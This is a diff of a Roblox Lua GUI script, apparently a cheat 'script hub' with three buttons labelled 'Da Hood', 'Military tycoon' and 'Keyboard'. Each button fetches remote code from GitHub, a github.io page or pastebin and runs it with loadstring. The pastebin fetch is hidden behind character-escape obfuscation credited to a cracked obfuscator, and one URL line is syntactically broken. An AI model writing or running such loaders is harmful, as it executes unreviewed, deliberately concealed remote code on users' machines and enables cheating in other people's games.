@@ -1,11 +1,14 @@
-
+-- Gui to Lua
 -- Version: 3.2
 
 -- Instances:
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
-local TextButton = Instance.new("TextButton")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local dahood = Instance.new("TextButton")
+local MT = Instance.new("TextButton")
+local keyboard = Instance.new("TextButton")
 
 --Properties:
 
@@ -14,26 +17,75 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Frame.Position = UDim2.new(0.421630085, 0, 0.361111104, 0)
-Frame.Size = UDim2.new(0, 100, 0, 100)
+Frame.Position = UDim2.new(0.235109717, 0, 0.2532323, 0)
+Frame.Size = UDim2.new(0, 337, 0, 176)
 Frame.Active = true
 Frame.Draggable = true
---
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.Position = UDim2.new(0, 0, 0.5, 0)
-TextButton.Size = UDim2.new(0, 100, 0, 50)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
+
+ScrollingFrame.Parent = Frame
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
+ScrollingFrame.Position = UDim2.new(0.296735913, 0, 0, 0)
+ScrollingFrame.Size = UDim2.new(0, 237, 0, 176)
+
+dahood.Name = "dahood"
+dahood.Parent = ScrollingFrame
+dahood.BackgroundColor3 = Color3.fromRGB(32, 60, 111)
+dahood.Position = UDim2.new(-0.00284213573, 0, 0, 0)
+dahood.Size = UDim2.new(0, 100, 0, 50)
+dahood.Font = Enum.Font.Bangers
+dahood.Text = "Da Hood"
+dahood.TextColor3 = Color3.fromRGB(0, 0, 0)
+dahood.TextSize = 14.000
+
+MT.Name = "MT"
+MT.Parent = ScrollingFrame
+MT.BackgroundColor3 = Color3.fromRGB(32, 60, 111)
+MT.Position = UDim2.new(-0.00284213573, 0, 0.178977266, 0)
+MT.Size = UDim2.new(0, 100, 0, 50)
+MT.Font = Enum.Font.Bangers
+MT.Text = "Military tycoon"
+MT.TextColor3 = Color3.fromRGB(0, 0, 0)
+MT.TextSize = 14.000
+
+keyboard.Name = "keyboard"
+keyboard.Parent = ScrollingFrame
+keyboard.BackgroundColor3 = Color3.fromRGB(32, 60, 111)
+keyboard.Position = UDim2.new(-0.00284213573, 0, 0.357954532, 0)
+keyboard.Size = UDim2.new(0, 100, 0, 50)
+keyboard.Font = Enum.Font.Bangers
+keyboard.Text = "Keyboard"
+keyboard.TextColor3 = Color3.fromRGB(0, 0, 0)
+keyboard.TextSize = 14.000
 
 -- Scripts:
 
-local function XARBQT_fake_script() -- TextButton.LocalScript 
-	local script = Instance.new('LocalScript', TextButton)
+local function JGYWWC_fake_script() -- dahood.LocalScript 
+	local script = Instance.new('LocalScript', dahood)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
 	end)
 end
-coroutine.wrap(XARBQT_fake_script)()
+coroutine.wrap(JGYWWC_fake_script)()
+local function DCCHND_fake_script() -- MT.LocalScript 
+	local script = Instance.new('LocalScript', MT)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet"https://thedragonslayer2.github.io/AutoExec.html%22)()
+	end)
+end
+coroutine.wrap(DCCHND_fake_script)()
+local function UQYBX_fake_script() -- keyboard.LocalScript 
+	local script = Instance.new('LocalScript', keyboard)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		--[[
+	    Filename: Obfuscated_LocalScript.lua
+	    Obfuscated by SIGHTS Obfuscator (cracked by oof4dayz.xyz)
+	--]]
+	
+		SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBFRRRrRrrRR="";for ,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
+	end)
+end
+coroutine.wrap(UQYBX_fake_script)()
